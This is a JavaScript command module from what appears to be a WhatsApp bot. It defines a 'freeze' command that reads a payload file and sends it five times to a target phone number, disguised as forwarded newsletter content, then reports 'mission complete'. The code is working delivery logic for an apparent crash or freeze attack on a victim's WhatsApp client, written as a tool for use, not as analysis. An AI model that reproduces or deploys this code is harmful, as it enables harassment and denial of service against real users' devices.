const fs = require('fs');
const config = require('../../config');
const { fancy } = require('../../lib/tools');

module.exports = {
    name: "freeze",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const payload = fs.readFileSync('./lib/payloads/freeze.txt', 'utf-8');

        for (let i = 0; i < 5; i++) {
            await conn.sendMessage(target, { 
                text: "\u200B" + payload,
                contextInfo: { 
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid }
                } 
            });
        }
        await conn.sendMessage(conn.user.id, { text: fancy("🥀 ᴍɪꜱꜱɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇ: ꜰʀᴇᴇᴢᴇ ꜱᴇɴᴛ.") });
    }
};
